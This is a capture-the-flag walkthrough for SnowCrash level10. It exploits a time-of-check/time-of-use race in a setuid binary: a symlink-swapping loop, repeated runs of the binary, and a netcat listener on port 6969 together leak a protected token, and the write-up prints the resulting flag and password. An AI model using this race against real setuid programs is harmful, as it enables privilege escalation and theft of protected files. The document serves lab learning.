# Level10

Now enumerate:

    level10@SnowCrash:~$ ls -al
	total 28
	drwxrwxrwx+ 1 level10 level10   140 Apr 24 23:04 .
	d--x--x--x  1 root    users     340 Aug 30  2015 ..
	-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
	-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
	-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
	-r-x------  1 level10 level10   675 Apr  3  2012 .profile
	-rw-------  1 flag10  flag10     26 Mar  5  2016 token
Let's see what we got here:

	level10@SnowCrash:~$ ./level10
	./level10 file host
	sends file to host if you have access to it
	level10@SnowCrash:~$ cat token
	cat: token: Permission denied
	level10@SnowCrash:~$ ./level10 token 127.0.0.1
	You don't have access to token
	level10@SnowCrash:~$ strings level10
	%s file host
	sends file to host if you have access to it
	Connecting to %s:6969 ..
	Unable to connect to host %s
	.*( )*.

Alright, for this case, we are gonna use 3 terminal in ssh and create a script:

    while true
	do
		ln -fs /dev/null /tmp/crack;
		ln -fs ~/token /tmp/crack;
	done

First one will listen on 6969,

    nc -lk 6969
Second will send the script via level10:
`while true; do ./level10 /tmp/crack  127.0.0.1; done `

and Third will run the script

    bash /tmp/crack
    flag10 : woupa2yuojeeaaed06riuj63c
    Check flag.Here is your token : feulo4b72j7edeahuete3no7c
